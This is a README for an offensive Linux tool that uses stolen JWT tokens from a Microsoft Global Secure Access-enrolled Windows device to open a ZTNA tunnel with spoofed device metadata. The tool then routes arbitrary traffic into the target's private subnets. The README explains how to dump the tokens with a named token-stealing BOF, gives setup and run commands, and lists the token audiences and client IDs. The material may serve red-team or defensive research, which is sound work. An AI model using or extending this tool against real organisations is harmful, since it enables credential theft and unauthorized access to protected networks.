# GSA Rogue Tunnel Client

A standalone Linux tunnel client for Microsoft Global Secure Access (ZTNA v2). Connects to Microsoft's edge servers using stolen or acquired tokens and routes arbitrary traffic through the ZTNA tunnel via a TUN interface.

## How It Works

1. **Authentication** — Three JWT tokens are needed: Tunnel (creates the tunnel), PortoToken (per-flow app authorization), and APS (bearer token on data flows). Tokens are extracted from a GSA-enrolled Windows device.

2. **Tunnel establishment** — Opens a bidirectional gRPC stream (`CreateControlChannel`) to the edge server, sends `CreateTunnelMessage` with the tunnel token and spoofed device metadata.

3. **TUN device** — Creates a Linux TUN interface (`gsa0`), assigns an IP, and replaces kernel routes so traffic to target subnets flows through the tunnel.

4. **Packet forwarding** — Reads raw IPv4 packets from TUN, creates per-connection gRPC flows (`CreateFlow`), and forwards packets bidirectionally. Responses from the server are written back to TUN for the kernel to deliver to applications.

5. **Flow lifecycle** — Each TCP connection or UDP destination gets its own gRPC flow. Flows are pre-authenticated on the control channel before data transfer. Stale flows are cleaned up after 120 seconds of inactivity.

## Setup

```bash
# Create virtual environment and install dependencies
python3 -m venv .venv
source .venv/bin/activate
pip install grpcio grpcio-tools protobuf msal

# Generate protobuf stubs from the proto definition
python -m grpc_tools.protoc \
    --proto_path=../proto \
    --python_out=. \
    --grpc_python_out=. \
    ../proto/ztna_v2.proto
```

## Token Acquisition

### Option 1: Extract from Windows device

Dump tokens from a GSA-enrolled device using the `gsa_tbres_steal` BOF, System Informer, or any method that can read TokenBroker `.tbres` files. Save the raw output to a file.

```bash
# The tunnel client parses JWT tokens from the dump by audience
sudo python3 gsa_tunnel.py --token-file /path/to/token_dump.txt
```


## Usage

```bash
# Basic — auto-extract tokens, route RFC1918 subnets through tunnel
sudo python3 gsa_tunnel.py --token-file /tmp/token

# Specific subnet only
sudo python3 gsa_tunnel.py --token-file /tmp/token --routes 192.168.255.0/24

# Custom tenant
sudo python3 gsa_tunnel.py --token-file /tmp/token --tenant <tenant-id>

# Debug logging
sudo python3 gsa_tunnel.py --token-file /tmp/token -v

# Skip DNS modification
sudo python3 gsa_tunnel.py --token-file /tmp/token --no-dns
```

## Token Audiences

| Token | Audience | Client ID | Used For |
|-------|----------|-----------|----------|
| Tunnel | `e92b9b37-1b47-4c01-9fbc-91d84450870e` | `cde6adac-0a5a-4a30-adaa-413e95264b5a` | `CreateTunnelMessage.tunnel_token` |
| Porto | `79486f61-d9f0-430e-9f7c-1713c8d9a2f9` | `760282b4-0cfc-4952-b467-c8e0298fee16` | `ClientFlowMetadata.app_token` |
| APS | `b3fa0115-39b3-4bec-8cc6-8c4fcd33e69d` | `ca01d00c-d191-45f2-87d5-7d5b9e9baea4` | `Authorization: Bearer` on `CreateFlow` |

Tokens expire in ~75 minutes.

## Limitations

- Requires root for TUN device creation and route management
- Only TCP and UDP traffic is tunneled (no ICMP)
- Token refresh is not automated — re-run token acquisition when tokens expire
- Connector must be online and able to reach the target resource
